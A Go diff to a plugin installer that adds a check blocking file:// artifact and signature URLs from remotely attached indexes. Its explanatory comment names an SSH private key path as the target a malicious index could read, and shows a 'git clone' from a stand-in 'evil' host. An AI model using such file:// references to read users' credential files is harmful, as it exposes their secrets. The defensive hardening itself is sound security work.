@@ -4,6 +4,7 @@ import (
 	"context"
 	"fmt"
 	"io"
+	"net/url"
 	"os"
 	"os/exec"
 	"path/filepath"
@@ -65,6 +66,15 @@ func installFrom(ctx context.Context, listed Listed, stderr io.Writer) (Report, 
 		return Report{}, view.Errorf("plugin.install.platform",
 			"%s offers no %s/%s build", m.Name, runtime.GOOS, runtime.GOARCH).
 			WithHint("it offers: " + m.Offered())
+	}
+
+	// The file:// gate, before anything is fetched or staged: what an index
+	// may make rta open is a fact about the index, and this is the first
+	// point where both the manifest and the index that carried it are in
+	// hand. Refusing here creates nothing at all.
+
+	if verr := checkLocalArtifacts(ctx, listed, plat); verr != nil {
+		return Report{}, verr
 	}
 
 	// Staging lives beside the store so the final rename is atomic — and in a
@@ -547,4 +557,83 @@ func declarationDiff(old, new plugin.Plugin) []string {
 	sort.Strings(removed)
 	sort.Strings(lines)
 	return append(lines, removed...)
+}
+
+// namesLocalFile reports whether one manifest URL will be read off this
+// machine's filesystem rather than fetched.
+func namesLocalFile(rawURL string) bool {
+	u, err := url.Parse(rawURL)
+	return err == nil && u.Scheme == "file"
+}
+
+// checkLocalArtifacts is the file:// gate: a manifest may name a path on this
+// machine only when the index that named it was attached from this machine
+// too.
+//
+// checkArtifactURL admits file:// for every manifest and says why — "file://
+// exists for local indexes" — and it has no way to enforce the second half of
+// its own sentence. It is the manifest grammar, so it also runs inside `rta
+// plugin manifest`, which legitimately writes file:// URLs with no index in
+// sight; putting the restriction there would refuse the local rehearsal the
+// generator exists for. The grammar admits the scheme, and this decides the
+// case, here, where the index is known.
+//
+// What it stops: an index cloned from anywhere can name
+// file:///home/you/.ssh/id_ed25519 as an artifact, and fetchArtifact opens
+// whatever absolute path a manifest gives it, in rta's own unconfined process
+// — while pluginhost's denyset refuses a *plugin* those exact paths. Nothing
+// leaves the machine: the checksum gate returns before anything is launched,
+// and plugindist is not reachable over MCP. What is left is a read rta had no
+// business making, and two oracles — the mismatch message's sha256 prefix, and
+// ENOENT against a mismatch — that land on the operator's terminal and in
+// rta.lock.
+//
+// The signature pair is worse, and is why this covers all three URLs rather
+// than sitting beside the checksum: checkSignature fetches the sig and the key
+// with no checksum to compare them against at all, so that read is
+// unconditional, and its outcome string is itself an existence oracle that
+// gets recorded. Deliberately not pushed down into checkSignature, which
+// refuses nothing by design — a refusal recorded as a signature verdict would
+// read as "this artifact failed verification" when what happened is that an
+// index asked rta to open a file.
+//
+// **What this does not buy, said plainly:** the question it answers is "was
+// this index attached from a path on this machine", not "did somebody local
+// write it". `git clone https://evil/rta-plugins && rta plugin index add
+// community ./rta-plugins` produces a local origin for an index somebody else
+// authored, and docs/writing-a-plugin.md teaches that attach-by-path shape.
+// The gate stops a *remote* index from reaching into the filesystem; it does
+// not vouch for the contents of a local one, and nothing here could.
+//
+// The origin is read only when a manifest actually names a local file, so an
+// index directory with no git remote at all still installs https artifacts and
+// loses only the one thing it cannot show it is entitled to. Any failure to
+// read it refuses: "I could not tell where this came from" belongs on the
+// closed side of a question about reading the operator's files.
+func checkLocalArtifacts(ctx context.Context, listed Listed, plat Platform) *view.Error {
+	local := namesLocalFile(plat.URL)
+	if s := listed.Manifest.Signature; s != nil {
+		local = local || namesLocalFile(s.Sig) || namesLocalFile(s.Key)
+	}
+	if !local {
+		return nil
+	}
+	ix, ok := IndexByName(listed.Index)
+	if !ok {
+		return noSuchIndex(listed.Index)
+	}
+	origin, verr := IndexOrigin(ctx, ix)
+	if verr != nil {
+		return verr
+	}
+	if kind, cerr := classifyGitURL(origin); cerr == nil && kind == gitLocalURL {
+		return nil
+	}
+	return view.Errorf("plugin.install.localfile",
+		"index %q names a local file and it was attached from %s",
+		listed.Index, OriginForDisplay(origin)).
+		WithHint("a file:// URL is for an index on this machine — the local rehearsal " +
+			"`rta plugin manifest --index` writes — and an index attached from elsewhere " +
+			"naming one is asking rta to open a file of its choosing; nothing was fetched, " +
+			"and the manifest is the index's to fix")
 }
